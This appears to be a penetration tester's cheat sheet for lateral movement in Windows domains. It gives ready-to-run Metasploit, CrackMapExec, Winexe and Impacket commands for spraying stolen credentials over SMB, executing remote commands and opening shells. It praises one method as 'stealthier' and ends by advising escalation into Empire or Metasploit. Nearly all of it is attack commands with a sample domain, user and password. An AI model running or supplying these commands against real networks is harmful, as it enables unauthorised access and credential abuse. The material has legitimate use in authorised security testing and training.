## ------ From Kali ------ ##

### --- Spray and Pray--- ###

```
msf > use auxiliary/scanner/smb/smb_login  
msf auxiliary(smb_login) > set SMBDomain CSCOU  
SMBDOMAIN => CSCOU  
msf auxiliary(smb_login) > set SMBUser jarrieta  
SMBUser => jarrieta  
msf auxiliary(smb_login) > set SMBPass nastyCutt3r  
SMBPass => nastyCutt3r  
msf auxiliary(smb_login) > services -p 445 -R  
msf auxiliary(smb_login) > run
```
*Note: Any succesfull logins will be stored in the msf database. View them with:* ```creds```

### --- CrackMapExec --- ###

Testing credentials and launching attacks on a large number of hosts
```python crackmapexec.py $ip_or_range -d $domain -u $user -p $password```


### --- Metasploit psexec --- ###

```use exploit windows/smb/psexec```

NOTE: ```auxiliary/admin/smb/psexec_command``` if you want to just run a single command. This module can also take a range of RHOSTS


### --- Winexe --- ###

An old *nix tool to execute Windows commands remotely. Built in to Kali or available here.
You can execute a single command or drop right into a command prompt:

```winexe -U $domain/$user%$password //$host_ip cmd.exe```


### --- psexec.py --- ###

Impacket

NOTE: Use clone in ```/opt```
```python psexec.py $domain/$user:$password@ip_address```


### --- smbexec --- ###
Impacket

This one is a bit "stealthier" as it doesn't drop a binary on the target system.
Commands and output are asynchronous

```python smbexec.py $domain/$user:$password@ip_address```


### --- wmiexec.py --- ###

Impacket

Under the hood this one uses Windows Management Instrumentation (WMI) to launch a semi-interactive shell.

```python wmiexec.py $domain/$user:$password@ip_address```


### --- CrackMapExec --- ###

You can also use CrackMapExec to execute commands on hosts by passing it the "-x" parameter.
Since it's built on Impacket's libraries, it's basically doing the exact same thing as wmiexec.py.
But let's you do it across a range of IPs

```python crackmapexec.py $ip_address -d $domain -u $user -p $pass -x $cmd```


### --- Remote Desktop/rdp_check --- ###

Impacket

```python rdp_check.py $domain/$user:$pass@$ip_address```

NOTE: Use these to get code execution and elevate into Empire/MSF
